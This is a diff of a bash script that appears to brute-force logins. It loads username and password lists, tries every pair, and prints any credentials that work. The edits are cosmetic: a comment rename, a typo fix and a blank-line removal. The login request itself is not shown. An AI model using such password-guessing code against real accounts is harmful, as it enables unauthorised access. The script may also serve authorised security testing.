@@ -29,7 +29,6 @@ if [[ -z ${pass_path} ]]; then
 	read -p "Please provide a file with passwords (file path) " pass_path
 fi
 
-
 # Adds every line from username file
 while IFS= read -r line; do
 	if [[ "${username_arr[@]}" == "${line}" ]]; then
@@ -46,7 +45,7 @@ while IFS= read -r line; do
 	password_arr+=("$line")
 done < ${pass_path}
 
-# Brute forcer
+# Tries every combination
 for ((i=0; i<${#username_arr[@]}; i++)); do
 	for ((j=0; j<${#password_arr[@]}; j++)); do
 		echo ""
@@ -55,7 +54,7 @@ for ((i=0; i<${#username_arr[@]}; i++)); do
 		echo "$result"		
 		if [[ "${result}" == "${username_arr[$i]}" ]]; then
 			echo ""
-			echo $'\033[0;32msucces! \e[0m' $'\n'"Username = ${username_arr[$i]}" $'\n'"Password = ${password_arr[$j]}"
+			echo $'\033[0;32msuccess! \e[0m' $'\n'"Username = ${username_arr[$i]}" $'\n'"Password = ${password_arr[$j]}"
 			exit 1	
 		fi
 	done
